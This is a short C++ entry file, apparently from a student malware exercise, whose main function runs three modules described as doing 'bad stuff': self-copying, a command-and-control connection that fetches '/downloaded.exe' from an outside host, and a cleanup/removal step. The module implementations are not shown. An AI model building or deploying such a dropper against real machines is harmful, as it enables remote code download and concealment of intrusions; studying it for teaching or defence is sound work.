// feelsbadman.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include "C2.h"
#include "CP.h"
#include "RM.h"
#include <iostream>


int main()
{
	// instantiate modules
	CP copyModule;
	C2 connModule("www.uvu-cybersecurity.com", "/downloaded.exe");
	RM remvModule;

	// do bad stuff
	copyModule.execute();
	connModule.execute();
	remvModule.execute();
	
}

